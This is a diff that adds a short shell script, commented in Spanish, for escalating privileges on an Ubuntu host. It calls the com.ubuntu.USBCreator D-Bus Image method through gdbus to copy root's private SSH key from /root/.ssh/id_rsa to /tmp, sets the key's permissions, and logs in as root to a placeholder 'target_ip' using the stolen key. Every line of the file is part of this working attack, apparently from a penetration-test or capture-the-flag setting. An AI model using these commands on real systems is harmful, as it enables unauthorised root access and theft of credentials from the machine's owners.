@@ -1,0 +1,8 @@
+# Extraer la clave SSH de root usando gdbus
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true
+
+# Dar permisos correctos a la clave
+chmod 600 /tmp/id_rsa
+
+# Conectarse vía SSH al host vulnerable usando la clave robada
+ssh -i /tmp/id_rsa root@target_ip
